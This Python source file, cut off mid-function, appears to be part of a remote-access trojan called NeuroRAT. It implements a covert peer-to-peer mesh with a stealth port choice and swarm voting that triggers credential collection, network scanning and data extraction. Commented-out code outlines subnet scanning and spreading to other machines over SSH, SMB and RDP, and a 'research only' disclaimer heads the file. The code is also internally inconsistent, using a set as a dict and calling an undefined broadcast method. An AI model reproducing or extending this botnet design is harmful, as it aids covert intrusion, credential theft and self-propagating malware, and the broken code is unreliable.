#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
NeuroRAT Swarm Intelligence Module
----------------------------------
Реализует децентрализованную сеть агентов с коллективным принятием решений.

⚠️ ПРЕДУПРЕЖДЕНИЕ ⚠️
Данный модуль предназначен ИСКЛЮЧИТЕЛЬНО для исследовательских целей.
Активация данного модуля в боевой среде может привести к созданию
неконтролируемой самоорганизующейся сети, что является незаконным и опасным.
Используйте только в контролируемом исследовательском окружении.

Автор: Mr. Thomas Anderson (iamtomasanderson@gmail.com)
Лицензия: MIT
"""

import os
import sys
import time
import json
import base64
import socket
import random
import hashlib
import threading
import ipaddress
import logging
import subprocess
from typing import Dict, List, Set, Any, Optional, Union, Tuple, Callable
from datetime import datetime
from pathlib import Path
from nacl.public import PrivateKey, PublicKey, Box
import nacl.utils
import platform

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("SwarmIntelligence")

class SwarmNode:
    """
    Узел роевого интеллекта. Позволяет агентам взаимодействовать напрямую 
    без центрального сервера, образуя децентрализованную mesh-сеть.
    """
    
    def __init__(
        self,
        node_id: str = None,
        listen_port: int = None,
        bootstrap_nodes: List[str] = None,
        max_connections: int = 25,
        encryption_key: str = None,
        discovery_enabled: bool = True,
        stealth_mode: bool = True,
        agent_context: Dict[str, Any] = None
    ):
        """
        Инициализация узла роевого интеллекта.
        
        Args:
            node_id: Уникальный идентификатор узла (генерируется если не указан)
            listen_port: Порт для прослушивания (случайный если не указан)
            bootstrap_nodes: Список начальных узлов для подключения
            max_connections: Максимальное количество активных соединений
            encryption_key: Ключ шифрования для защиты коммуникаций
            discovery_enabled: Включен ли поиск других узлов
            stealth_mode: Режим скрытности для минимизации сетевого шума
            agent_context: Контекст агента для совместного использования данных
        """
        # Идентификация узла
        self.node_id = node_id or self._generate_node_id()
        self.listen_port = listen_port or self._get_random_port()
        self.bootstrap_nodes = bootstrap_nodes or []
        self.max_connections = max_connections
        self.stealth_mode = stealth_mode
        self.agent_context = agent_context or {}
        
        # Шифрование
        self.encryption_key = encryption_key or self._generate_encryption_key()
        
        # Топология сети и состояние
        self.known_nodes: Dict[str, Dict[str, Any]] = {}  # id -> info
        self.connected_nodes: Set[str] = set()  # Активные соединения
        self.blacklisted_nodes: Set[str] = set()  # Плохие узлы
        
        # Данные роя
        self.swarm_data = {
            "threat_intelligence": {},
            "discovered_vulnerabilities": {},
            "exfiltrated_data_index": {},
            "collective_decisions": {},
            "network_map": {},
        }
        
        # Временные метки и счетчики
        self.last_discovery = 0
        self.last_sync = 0
        self.message_counter = 0
        
        # Сокеты и потоки
        self.listen_socket = None
        self.running = False
        self.threads = []
        
        # Семафоры и блокировки
        self.swarm_data_lock = threading.RLock()
        self.nodes_lock = threading.RLock()
        self.connection_lock = threading.RLock()
        
        # Включаем обнаружение если разрешено
        self.discovery_enabled = discovery_enabled
        
        # Компоненты роевого интеллекта
        self.consensus_engine = ConsensusEngine(self)
        self.task_distributor = TaskDistributor(self)
    
    def _generate_node_id(self) -> str:
        """Генерирует уникальный идентификатор узла."""
        hostname = socket.gethostname()
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        random_component = str(random.randint(10000, 99999))
        
        # Создаем хеш для уникальности
        hash_input = f"{hostname}:{timestamp}:{random_component}"
        return hashlib.sha256(hash_input.encode()).hexdigest()[:16]
    
    def _generate_encryption_key(self) -> str:
        """Генерирует ключ шифрования для защищенной коммуникации."""
        random_bytes = os.urandom(32)  # 256 бит
        return base64.b64encode(random_bytes).decode('utf-8')
    
    def _get_random_port(self) -> int:
        """Выбирает случайный свободный порт для прослушивания."""
        # В скрытном режиме используем порты, которые часто используются легитимными сервисами
        common_ports = [
            443, 8443, 8080, 8000, 9443  # HTTPS и общие веб-порты
        ]
        
        if self.stealth_mode:
            for port in common_ports:
                if self._is_port_available(port):
                    return port
        
        # Если не нашли свободный порт из списка или не в скрытном режиме
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('', 0))
        port = sock.getsockname()[1]
        sock.close()
        return port
    
    def _is_port_available(self, port: int) -> bool:
        """Проверяет, доступен ли порт для прослушивания."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind(('', port))
            sock.close()
            return True
        except:
            return False
    
    def start(self) -> bool:
        """
        Запускает узел роевого интеллекта.
        
        Returns:
            bool: Успешность запуска
        """
        if self.running:
            logger.warning("Узел уже запущен")
            return True
        
        logger.info(f"Запуск узла роевого интеллекта {self.node_id}")
        self.running = True
        
        try:
            # Запускаем прослушивание
            self._start_listening()
            
            # Запускаем потоки управления сетью
            self._start_management_threads()
            
            # Подключаемся к начальным узлам
            if self.bootstrap_nodes:
                self._connect_to_bootstrap_nodes()
            
            logger.info(f"Узел роевого интеллекта запущен на порту {self.listen_port}")
            return True
        
        except Exception as e:
            logger.error(f"Ошибка при запуске узла: {str(e)}")
            self.running = False
            return False
    
    def stop(self):
        """Останавливает узел роевого интеллекта."""
        if not self.running:
            return
        
        logger.info("Остановка узла роевого интеллекта")
        self.running = False
        
        # Закрываем слушающий сокет
        if self.listen_socket:
            try:
                self.listen_socket.close()
            except:
                pass
        
        # Закрываем соединения
        with self.nodes_lock:
            for node_id in list(self.connected_nodes):
                self._disconnect_node(node_id)
        
        # Ждем завершения потоков
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=2.0)
        
        logger.info("Узел роевого интеллекта остановлен")
    
    def _start_listening(self):
        """Запускает прослушивание входящих соединений."""
        try:
            self.listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.listen_socket.bind(('0.0.0.0', self.listen_port))
            self.listen_socket.listen(5)
            
            # Запускаем поток прослушивания
            listener_thread = threading.Thread(
                target=self._listener_loop,
                name="swarm_listener"
            )
            listener_thread.daemon = True
            listener_thread.start()
            self.threads.append(listener_thread)
            
            logger.info(f"Начато прослушивание на порту {self.listen_port}")
            
        except Exception as e:
            logger.error(f"Ошибка при запуске прослушивания: {str(e)}")
            raise
    
    def _start_management_threads(self):
        """Запускает потоки управления сетью."""
        # Поток обнаружения узлов
        if self.discovery_enabled:
            discovery_thread = threading.Thread(
                target=self._discovery_loop,
                name="swarm_discovery"
            )
            discovery_thread.daemon = True
            discovery_thread.start()
            self.threads.append(discovery_thread)
        
        # Поток синхронизации данных
        sync_thread = threading.Thread(
            target=self._sync_loop,
            name="swarm_sync"
        )
        sync_thread.daemon = True
        sync_thread.start()
        self.threads.append(sync_thread)
        
        # Поток мониторинга сети
        monitor_thread = threading.Thread(
            target=self._monitor_loop,
            name="swarm_monitor"
        )
        monitor_thread.daemon = True
        monitor_thread.start()
        self.threads.append(monitor_thread)
        
        # Поток принятия решений
        decision_thread = threading.Thread(
            target=self._decision_loop,
            name="swarm_decisions"
        )
        decision_thread.daemon = True
        decision_thread.start()
        self.threads.append(decision_thread)
    
    def _connect_to_bootstrap_nodes(self):
        """Подключается к начальным узлам."""
        for node_address in self.bootstrap_nodes:
            try:
                parts = node_address.split(':')
                if len(parts) != 2:
                    continue
                
                host, port = parts[0], int(parts[1])
                self._connect_to_node(host, port)
                
            except Exception as e:
                logger.warning(f"Ошибка при подключении к начальному узлу {node_address}: {str(e)}")
    
    def _listener_loop(self):
        """Цикл прослушивания входящих соединений."""
        while self.running:
            try:
                client_socket, addr = self.listen_socket.accept()
                
                # Проверка, не превышено ли максимальное число соединений
                with self.nodes_lock:
                    if len(self.connected_nodes) >= self.max_connections:
                        logger.warning(f"Превышено максимальное число соединений. Отклоняем {addr}")
                        client_socket.close()
                        continue
                
                # Запускаем обработку соединения в отдельном потоке
                client_thread = threading.Thread(
                    target=self._handle_incoming_connection,
                    args=(client_socket, addr)
                )
                client_thread.daemon = True
                client_thread.start()
                
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    logger.error(f"Ошибка в цикле прослушивания: {str(e)}")
                    time.sleep(1)  # Предотвращаем 100% загрузку CPU при ошибках
    
    def _connect_to_node(self, host, port):
        """Подключается к узлу по указанному адресу и порту."""
        logger.info(f"Попытка подключения к узлу {host}:{port}")
        
        try:
            # Проверка, что еще не подключены к этому узлу
            node_address = f"{host}:{port}"
            with self.nodes_lock:
                for node_info in self.known_nodes.values():
                    if node_info.get("address") == node_address:
                        # Уже знаем об этом узле
                        logger.debug(f"Узел {host}:{port} уже известен")
                        return False
            
            # Создаем сокет для подключения
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.settimeout(5)  # 5 секунд на подключение
            client_socket.connect((host, port))
            
            # Отправляем приветственное сообщение
            hello_message = {
                "type": "hello",
                "node_id": self.node_id,
                "version": "1.0",
                "timestamp": time.time()
            }
            
            self._send_encrypted_message(client_socket, hello_message)
            
            # Ожидаем ответа
            response = self._receive_encrypted_message(client_socket)
            if not response or response.get("type") != "hello_ack":
                logger.warning(f"Не получен корректный ответ от {host}:{port}")
                client_socket.close()
                return False
            
            # Получаем ID удаленного узла
            remote_node_id = response.get("node_id")
            if not remote_node_id:
                logger.warning(f"Не получен ID узла от {host}:{port}")
                client_socket.close()
                return False
            
            if remote_node_id == self.node_id:
                logger.debug(f"Попытка подключения к самому себе на {host}:{port}")
                client_socket.close()
                return False
            
            # Регистрируем узел
            with self.nodes_lock:
                self.known_nodes[remote_node_id] = {
                    "address": node_address,
                    "first_seen": time.time(),
                    "last_seen": time.time()
                }
                self.connected_nodes[remote_node_id] = client_socket
            
            # Запускаем поток для приема сообщений
            receive_thread = threading.Thread(
                target=self._node_receive_loop,
                args=(remote_node_id, client_socket),
                name=f"node_receive_{remote_node_id[:8]}"
            )
            receive_thread.daemon = True
            receive_thread.start()
            
            logger.info(f"Успешное подключение к узлу {remote_node_id} на {host}:{port}")
            return True
            
        except Exception as e:
            logger.debug(f"Ошибка при подключении к {host}:{port}: {str(e)}")
            return False
    
    def _handle_incoming_connection(self, client_socket, addr):
        """Обрабатывает входящее соединение от другого узла."""
        logger.debug(f"Обработка входящего соединения от {addr}")
        
        try:
            # Устанавливаем таймаут для операций с сокетом
            client_socket.settimeout(10)
            
            # Ожидаем приветственное сообщение
            message = self._receive_encrypted_message(client_socket)
            if not message or message.get("type") != "hello":
                logger.warning(f"Не получено приветственное сообщение от {addr}")
                client_socket.close()
                return
            
            # Получаем ID удаленного узла
            remote_node_id = message.get("node_id")
            if not remote_node_id:
                logger.warning(f"Не получен ID узла от {addr}")
                client_socket.close()
                return
            
            if remote_node_id == self.node_id:
                logger.warning(f"Попытка подключения от узла с таким же ID ({remote_node_id})")
                client_socket.close()
                return
            
            # Проверяем, не превышен ли лимит соединений
            with self.nodes_lock:
                if len(self.connected_nodes) >= self.max_connections:
                    logger.warning(f"Превышен лимит соединений. Отклоняем {addr}")
                    client_socket.close()
                    return
            
            # Отправляем ответ на приветствие
            hello_ack = {
                "type": "hello_ack",
                "node_id": self.node_id,
                "version": "1.0",
                "timestamp": time.time()
            }
            
            self._send_encrypted_message(client_socket, hello_ack)
            
            # Регистрируем узел
            with self.nodes_lock:
                self.known_nodes[remote_node_id] = {
                    "address": f"{addr[0]}:{addr[1]}",
                    "first_seen": time.time(),
                    "last_seen": time.time()
                }
                self.connected_nodes[remote_node_id] = client_socket
            
            # Запускаем поток для приема сообщений
            receive_thread = threading.Thread(
                target=self._node_receive_loop,
                args=(remote_node_id, client_socket),
                name=f"node_receive_{remote_node_id[:8]}"
            )
            receive_thread.daemon = True
            receive_thread.start()
            
            logger.info(f"Успешно обработано входящее соединение от узла {remote_node_id}")
            
        except Exception as e:
            logger.error(f"Ошибка при обработке входящего соединения от {addr}: {str(e)}")
            client_socket.close()
    
    def _node_receive_loop(self, node_id, socket):
        """Цикл приема сообщений от подключенного узла."""
        logger.debug(f"Запуск цикла приема сообщений от узла {node_id}")
        
        try:
            while self.running:
                try:
                    message = self._receive_encrypted_message(socket)
                    if not message:
                        logger.debug(f"Соединение с узлом {node_id} закрыто")
                        break
                    
                    # Обновляем время последнего взаимодействия
                    with self.nodes_lock:
                        if node_id in self.known_nodes:
                            self.known_nodes[node_id]["last_seen"] = time.time()
                    
                    # Обрабатываем сообщение
                    self._handle_node_message(node_id, message)
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    logger.error(f"Ошибка при приеме сообщения от узла {node_id}: {str(e)}")
                    break
            
            # Закрываем соединение при выходе из цикла
            self._disconnect_node(node_id)
            
        except Exception as e:
            logger.error(f"Критическая ошибка в цикле приема от узла {node_id}: {str(e)}")
            self._disconnect_node(node_id)
    
    def _disconnect_node(self, node_id):
        """Отключает узел и закрывает соединение."""
        logger.info(f"Отключение узла {node_id}")
        
        with self.nodes_lock:
            if node_id in self.connected_nodes:
                try:
                    self.connected_nodes[node_id].close()
                except Exception:
                    pass
                del self.connected_nodes[node_id]
    
    def _handle_node_message(self, node_id, message):
        """Обрабатывает сообщение от узла."""
        message_type = message.get("type")
        
        if message_type == "ping":
            # Отвечаем на пинг
            response = {
                "type": "pong",
                "sender_id": self.node_id,
                "timestamp": time.time()
            }
            self._send_message_to_node(node_id, response)
            
        elif message_type == "pong":
            # Просто обновляем время последнего взаимодействия (уже сделано в _node_receive_loop)
            pass
            
        elif message_type == "proposal":
            # Обрабатываем предложение через движок консенсуса
            if hasattr(self, "consensus_engine"):
                # Этот код будет выполнен, если consensus_engine доступен
                pass
                
        elif message_type == "consensus":
            # Обрабатываем достигнутый консенсус
            if hasattr(self, "consensus_engine"):
                # Этот код будет выполнен, если consensus_engine доступен
                pass
                
        elif message_type == "task":
            # Обрабатываем задачу через распределитель задач
            if hasattr(self, "task_distributor"):
                # Этот код будет выполнен, если task_distributor доступен
                pass
                
        elif message_type == "task_result":
            # Обрабатываем результат задачи
            if hasattr(self, "task_distributor"):
                # Этот код будет выполнен, если task_distributor доступен
                pass
                
        else:
            logger.warning(f"Получено сообщение неизвестного типа от узла {node_id}: {message_type}")
    
    def _send_encrypted_message(self, socket, message):
        """Отправляет зашифрованное сообщение."""
        try:
            # В учебной версии просто сериализуем JSON
            message_json = json.dumps(message)
            message_bytes = message_json.encode('utf-8')
            
            # Отправляем длину сообщения (4 байта)
            message_length = len(message_bytes)
            socket.sendall(message_length.to_bytes(4, byteorder='big'))
            
            # Отправляем само сообщение
            socket.sendall(message_bytes)
            
            return True
        except Exception as e:
            logger.error(f"Ошибка при отправке сообщения: {str(e)}")
            return False
    
    def _receive_encrypted_message(self, socket):
        """Принимает зашифрованное сообщение."""
        try:
            # Получаем длину сообщения (4 байта)
            length_bytes = socket.recv(4)
            if not length_bytes:
                return None  # Соединение закрыто
                
            message_length = int.from_bytes(length_bytes, byteorder='big')
            
            # Получаем само сообщение
            message_bytes = b''
            while len(message_bytes) < message_length:
                chunk = socket.recv(message_length - len(message_bytes))
                if not chunk:
                    return None  # Соединение закрыто
                message_bytes += chunk
            
            # В учебной версии просто десериализуем JSON
            message_json = message_bytes.decode('utf-8')
            message = json.loads(message_json)
            
            return message
        except Exception as e:
            logger.error(f"Ошибка при приеме сообщения: {str(e)}")
            return None
    
    def _discovery_loop(self):
        """Цикл обнаружения других узлов в сети (безопасная версия)."""
        logger.info("Запуск цикла обнаружения узлов")
        
        while self.running:
            try:
                # Безопасный режим обнаружения - только через известные точки входа
                for bootstrap_node in self.bootstrap_nodes:
                    try:
                        host, port = bootstrap_node.split(":")
                        port = int(port)
                        self._connect_to_node(host, port)
                    except Exception as e:
                        logger.debug(f"Ошибка подключения к {bootstrap_node}: {str(e)}")
                
                # Отправка сигналов присутствия в сеть для обнаружения
                self._ping_known_nodes()
                
                # Задержка между циклами обнаружения (в безопасном режиме - большой интервал)
                time.sleep(60)  # 1 минута между попытками обнаружения
                
            except Exception as e:
                logger.error(f"Ошибка в цикле обнаружения: {str(e)}")
                time.sleep(10)  # Защита от слишком частых попыток при ошибках
    
    def _ping_known_nodes(self):
        """Отправляет сигналы присутствия известным узлам."""
        with self.nodes_lock:
            for node_id, node_info in list(self.known_nodes.items()):
                try:
                    message = {
                        "type": "ping",
                        "sender_id": self.node_id,
                        "timestamp": time.time()
                    }
                    
                    # Отправляем только узлам, с которыми нет активного соединения
                    if node_id not in self.connected_nodes:
                        self._send_message_to_node(node_id, message)
                        
                except Exception as e:
                    logger.debug(f"Ошибка при пинге узла {node_id}: {str(e)}")
    
    def _sync_loop(self):
        """Цикл синхронизации данных между узлами."""
        logger.info("Запуск цикла синхронизации данных")
        
        while self.running:
            try:
                # Периодический обмен данными между узлами
                with self.nodes_lock:
                    for node_id in list(self.connected_nodes):
                        self._sync_with_node(node_id)
                
                # Задержка между синхронизациями
                time.sleep(30)  # 30 секунд между синхронизациями
                
            except Exception as e:
                logger.error(f"Ошибка в цикле синхронизации: {str(e)}")
                time.sleep(5)
    
    def _monitor_loop(self):
        """Цикл мониторинга состояния сети."""
        logger.info("Запуск цикла мониторинга сети")
        
        while self.running:
            try:
                # Проверка активности узлов
                self._check_node_activity()
                
                # Обновление статистики
                self._update_network_stats()
                
                # Задержка между проверками
                time.sleep(15)  # 15 секунд между проверками
                
            except Exception as e:
                logger.error(f"Ошибка в цикле мониторинга: {str(e)}")
                time.sleep(5)
    
    def _decision_loop(self):
        """Цикл принятия решений в рое."""
        logger.info("Запуск цикла принятия решений")
        
        while self.running:
            try:
                # Анализ состояния и принятие решений на основе данных
                self._analyze_and_decide()
                
                # Задержка между циклами принятия решений
                time.sleep(60)  # 1 минута между циклами принятия решений
                
            except Exception as e:
                logger.error(f"Ошибка в цикле принятия решений: {str(e)}")
                time.sleep(10)
    
    # Заглушки для необходимых методов
    
    def _sync_with_node(self, node_id):
        """Синхронизирует данные с узлом."""
        pass
    
    def _check_node_activity(self):
        """Проверяет активность узлов."""
        pass
    
    def _update_network_stats(self):
        """Обновляет статистику сети."""
        pass
    
    def _analyze_and_decide(self):
        """Анализирует данные и принимает решения."""
        pass
    
    def _send_message_to_node(self, node_id, message):
        """Отправляет сообщение указанному узлу."""
        pass
    
    # Другие методы класса...
    
    # ВАЖНО: Закомментированный код для критических функций

# Закомментированные критические функции (отключены в целях безопасности)
# def _explore_network(self):
#     """Активно исследует сеть для поиска других агентов."""
#     logger.info("Начинаем активное сканирование сети")
#     
#     try:
#         # Получаем локальный IP и маску сети
#         local_ip = self._get_local_ip()
#         if not local_ip:
#             return
#         
#         network = self._get_network_cidr(local_ip)
#         if not network:
#             return
#         
#         logger.info(f"Сканирование сети {network}")
#         
#         # Генерируем список IP для сканирования
#         ip_network = ipaddress.IPv4Network(network, strict=False)
#         
#         # Создаем пул потоков для быстрого сканирования
#         with ThreadPoolExecutor(max_workers=50) as executor:
#             # Подготавливаем задания на сканирование
#             scan_targets = [
#                 (str(ip), self.listen_port) for ip in ip_network
#                 if str(ip) != local_ip and not ip.is_multicast
#             ]
#             
#             # Запускаем сканирование
#             executor.map(lambda args: self._scan_target(*args), scan_targets)
#     
#     except Exception as e:
#         logger.error(f"Ошибка при сканировании сети: {str(e)}")
# 
# def _propagate(self, target_ip: str, target_port: int = None):
#     """
#     Пытается распространить узел на целевую систему.
#     
#     ВНИМАНИЕ: Эта функция может нарушать законодательство во многих странах.
#     Используйте только на системах, которыми владеете или имеете разрешение.
#     """
#     logger.info(f"Попытка распространения на {target_ip}")
#     
#     try:
#         # Проверяем основные порты для возможных уязвимостей
#         open_ports = self._scan_common_services(target_ip)
#         if not open_ports:
#             logger.warning(f"Не найдено открытых портов на {target_ip}")
#             return False
#         
#         # Пытаемся определить ОС
#         target_os = self._detect_os(target_ip)
#         logger.info(f"Обнаружена ОС: {target_os}")
#         
#         # Выбираем метод распространения в зависимости от ОС и открытых портов
#         if 22 in open_ports and target_os != "Windows":
#             # SSH
#             return self._propagate_ssh(target_ip)
#         elif 445 in open_ports and target_os == "Windows":
#             # SMB
#             return self._propagate_smb(target_ip)
#         elif 3389 in open_ports and target_os == "Windows":
#             # RDP
#             return self._propagate_rdp(target_ip)
#         
#         return False
#     
#     except Exception as e:
#         logger.error(f"Ошибка при попытке распространения: {str(e)}")
#         return False

# Вспомогательные классы для роевого интеллекта

class ConsensusEngine:
    """
    Движок консенсуса для роевого принятия решений.
    """
    
    def __init__(self, node):
        """
        Инициализация движка консенсуса.
        
        Args:
            node: Родительский узел роевого интеллекта
        """
        self.node = node
        self.decisions_history = []
        self.current_votes = {}
        self.decisions_lock = threading.RLock()
    
    def propose_action(self, action_type: str, action_data: Dict[str, Any]) -> str:
        """
        Предлагает действие для обсуждения в рое.
        
        Args:
            action_type: Тип действия
            action_data: Данные действия
            
        Returns:
            Идентификатор предложения
        """
        proposal_id = self._generate_proposal_id(action_type, action_data)
        
        with self.decisions_lock:
            self.current_votes[proposal_id] = {
                "action_type": action_type,
                "action_data": action_data,
                "votes": {
                    self.node.node_id: True  # Голосуем за своё предложение
                },
                "timestamp": time.time(),
                "status": "proposed"
            }
        
        # Распространяем предложение по сети
        self._broadcast_proposal(proposal_id)
        
        return proposal_id
    
    def vote_for_proposal(self, proposal_id: str, vote: bool) -> bool:
        """
        Голосует за предложенное действие.
        
        Args:
            proposal_id: Идентификатор предложения
            vote: За или против
            
        Returns:
            Успешность голосования
        """
        with self.decisions_lock:
            if proposal_id not in self.current_votes:
                return False
            
            self.current_votes[proposal_id]["votes"][self.node.node_id] = vote
            
            # Проверяем, достигнут ли консенсус
            self._check_consensus(proposal_id)
            
            return True
    
    def _generate_proposal_id(self, action_type: str, action_data: Dict[str, Any]) -> str:
        """Генерирует уникальный идентификатор предложения."""
        proposal_str = f"{action_type}:{json.dumps(action_data, sort_keys=True)}:{time.time()}"
        return hashlib.sha256(proposal_str.encode()).hexdigest()[:16]
    
    def _broadcast_proposal(self, proposal_id: str):
        """Рассылает предложение всем подключенным узлам."""
        with self.decisions_lock:
            if proposal_id not in self.current_votes:
                return
            
            proposal_data = self.current_votes[proposal_id]
            message = {
                "type": "proposal",
                "proposal_id": proposal_id,
                "action_type": proposal_data["action_type"],
                "action_data": proposal_data["action_data"],
                "timestamp": proposal_data["timestamp"]
            }
            
            # Рассылка через узел
            self.node._broadcast_message(message)
    
    def _check_consensus(self, proposal_id: str) -> bool:
        """
        Проверяет, достигнут ли консенсус по предложению.
        
        Args:
            proposal_id: Идентификатор предложения
            
        Returns:
            Достигнут ли консенсус
        """
        with self.decisions_lock:
            if proposal_id not in self.current_votes:
                return False
            
            proposal_data = self.current_votes[proposal_id]
            votes = proposal_data["votes"]
            
            total_votes = len(votes)
            positive_votes = sum(1 for vote in votes.values() if vote)
            
            # Кворум - более 50% узлов проголосовали
            known_nodes_count = len(self.node.known_nodes)
            quorum_reached = total_votes >= max(3, known_nodes_count // 2)
            
            if not quorum_reached:
                return False
            
            # Решение принято, если более 66% голосов положительные
            consensus_ratio = positive_votes / total_votes
            consensus_reached = consensus_ratio >= 0.66
            
            if consensus_reached:
                proposal_data["status"] = "accepted"
                proposal_data["consensus_time"] = time.time()
                proposal_data["consensus_ratio"] = consensus_ratio
                
                # Сохраняем принятое решение в истории
                self.decisions_history.append(proposal_data)
                
                # Оповещаем о принятом решении
                self._broadcast_consensus(proposal_id, True, consensus_ratio)
                
                # Выполняем действие
                self._execute_consensus_action(proposal_id)
                
                return True
            
            # Если много голосов против, отклоняем предложение
            if total_votes >= max(5, known_nodes_count * 0.4) and consensus_ratio < 0.4:
                proposal_data["status"] = "rejected"
                proposal_data["consensus_time"] = time.time()
                proposal_data["consensus_ratio"] = consensus_ratio
                
                # Оповещаем об отклонении
                self._broadcast_consensus(proposal_id, False, consensus_ratio)
                
                return True
            
            return False
    
    def _broadcast_consensus(self, proposal_id: str, accepted: bool, consensus_ratio: float):
        """
        Оповещает все узлы о достижении консенсуса.
        
        Args:
            proposal_id: Идентификатор предложения
            accepted: Принято ли предложение
            consensus_ratio: Коэффициент консенсуса
        """
        message = {
            "type": "consensus",
            "proposal_id": proposal_id,
            "accepted": accepted,
            "consensus_ratio": consensus_ratio,
            "timestamp": time.time()
        }
        
        # Рассылка через узел
        self.node._broadcast_message(message)
    
    def _execute_consensus_action(self, proposal_id: str):
        """
        Выполняет действие после достижения консенсуса.
        
        Args:
            proposal_id: Идентификатор предложения
        """
        with self.decisions_lock:
            if proposal_id not in self.current_votes:
                return
            
            proposal_data = self.current_votes[proposal_id]
            if proposal_data["status"] != "accepted":
                return
            
            action_type = proposal_data["action_type"]
            action_data = proposal_data["action_data"]
            
            logger.info(f"Выполнение действия по консенсусу: {action_type}")
            
            # Выполнение различных типов действий
            if action_type == "data_collection":
                self._execute_data_collection(action_data)
            elif action_type == "network_scan":
                self._execute_network_scan(action_data)
            elif action_type == "stealth_adjustment":
                self._execute_stealth_adjustment(action_data)
            
            # Отмечаем, что действие выполнено
            proposal_data["status"] = "executed"
            proposal_data["execution_time"] = time.time()
    
    def _execute_data_collection(self, action_data: Dict[str, Any]):
        """Выполняет сбор данных по консенсусу."""
        target_type = action_data.get("target_type")
        if not target_type:
            return
        
        # Различные типы сбора данных
        if target_type == "system_info":
            # Сбор системной информации
            pass
        elif target_type == "stored_credentials":
            # Сбор сохраненных учетных данных
            pass
    
    def _execute_network_scan(self, action_data: Dict[str, Any]):
        """Выполняет сканирование сети по консенсусу."""
        scan_type = action_data.get("scan_type")
        if not scan_type:
            return
        
        # Различные типы сканирования
        if scan_type == "discover_nodes":
            # Поиск других узлов в сети
            pass
        elif scan_type == "vulnerability_scan":
            # Поиск уязвимостей
            pass
    
    def _execute_stealth_adjustment(self, action_data: Dict[str, Any]):
        """Корректирует параметры скрытности по консенсусу."""
        stealth_level = action_data.get("stealth_level")
        if stealth_level is None:
            return
        
        # Изменение параметров скрытности
        logger.info(f"Корректировка уровня скрытности: {stealth_level}")

class TaskDistributor:
    """
    Распределитель задач для роевого интеллекта.
    """
    
    def __init__(self, node):
        """
        Инициализация распределителя задач.
        
        Args:
            node: Родительский узел роевого интеллекта
        """
        self.node = node
        self.tasks = {}
        self.task_results = {}
        self.tasks_lock = threading.RLock()
    
    def create_task(self, task_type: str, task_data: Dict[str, Any]) -> str:
        """
        Создает новую задачу для распределения в рое.
        
        Args:
            task_type: Тип задачи
            task_data: Данные задачи
            
        Returns:
            Идентификатор задачи
        """
        task_id = self._generate_task_id(task_type, task_data)
        
        with self.tasks_lock:
            self.tasks[task_id] = {
                "type": task_type,
                "data": task_data,
                "status": "created",
                "created_at": time.time(),
                "assigned_to": None,
                "result": None
            }
        
        # Распространяем задачу
        self._distribute_task(task_id)
        
        return task_id
    
    def _generate_task_id(self, task_type: str, task_data: Dict[str, Any]) -> str:
        """Генерирует уникальный идентификатор задачи."""
        task_str = f"{task_type}:{json.dumps(task_data, sort_keys=True)}:{time.time()}"
        return hashlib.sha256(task_str.encode()).hexdigest()[:16]
    
    def _distribute_task(self, task_id: str):
        """
        Распределяет задачу среди узлов роя.
        
        Args:
            task_id: Идентификатор задачи
        """
        with self.tasks_lock:
            if task_id not in self.tasks:
                return
            
            task = self.tasks[task_id]
            
            # Находим наиболее подходящий узел для задачи
            best_node = self._find_best_node_for_task(task)
            if not best_node:
                # Если подходящего узла нет, выполняем сами
                task["assigned_to"] = self.node.node_id
                self._execute_task(task_id)
                return
            
            # Назначаем задачу выбранному узлу
            task["assigned_to"] = best_node
            task["status"] = "assigned"
            
            # Отправляем задачу узлу
            if best_node == self.node.node_id:
                # Выполняем локально
                self._execute_task(task_id)
            else:
                # Отправляем удаленному узлу
                message = {
                    "type": "task_assignment",
                    "task_id": task_id,
                    "task_type": task["type"],
                    "task_data": task["data"]
                }
                
                self.node._send_message_to_node(best_node, message)
    
    def _find_best_node_for_task(self, task: Dict[str, Any]) -> Optional[str]:
        """
        Находит наиболее подходящий узел для выполнения задачи.
        
        Args:
            task: Данные задачи
            
        Returns:
            Идентификатор лучшего узла или None
        """
        # В простейшем случае выбираем случайный узел
        with self.node.nodes_lock:
            connected_nodes = list(self.node.connected_nodes)
            if not connected_nodes:
                return self.node.node_id
            
            # Добавляем себя к списку
            all_nodes = connected_nodes + [self.node.node_id]
            
            # В будущем здесь могла бы быть более сложная логика,
            # учитывающая возможности узлов и их загрузку
            return random.choice(all_nodes)
    
    def _execute_task(self, task_id: str):
        """
        Выполняет назначенную задачу.
        
        Args:
            task_id: Идентификатор задачи
        """
        with self.tasks_lock:
            if task_id not in self.tasks:
                return
            
            task = self.tasks[task_id]
            if task["status"] != "assigned" or task["assigned_to"] != self.node.node_id:
                return
            
            # Отмечаем, что задача выполняется
            task["status"] = "executing"
            
            # Запускаем выполнение в отдельном потоке
            threading.Thread(
                target=self._task_execution_thread,
                args=(task_id,),
                daemon=True
            ).start()
    
    def _task_execution_thread(self, task_id: str):
        """
        Поток выполнения задачи.
        
        Args:
            task_id: Идентификатор задачи
        """
        try:
            with self.tasks_lock:
                if task_id not in self.tasks:
                    return
                
                task = self.tasks[task_id]
                task_type = task["type"]
                task_data = task["data"]
            
            # Выполняем нужный тип задачи
            result = None
            if task_type == "reconnaissance":
                result = self._execute_reconnaissance_task(task_data)
            elif task_type == "data_extraction":
                result = self._execute_data_extraction_task(task_data)
            elif task_type == "system_analysis":
                result = self._execute_system_analysis_task(task_data)
            
            # Сохраняем результат
            with self.tasks_lock:
                if task_id in self.tasks:
                    task = self.tasks[task_id]
                    task["status"] = "completed"
                    task["completed_at"] = time.time()
                    task["result"] = result
                    
                    # Добавляем в общие результаты
                    self.task_results[task_id] = result
            
            # Отправляем результат создателю задачи, если это не мы сами
            # (логика передачи результатов)
            
        except Exception as e:
            logger.error(f"Ошибка при выполнении задачи {task_id}: {str(e)}")
            
            # Отмечаем задачу как неудачную
            with self.tasks_lock:
                if task_id in self.tasks:
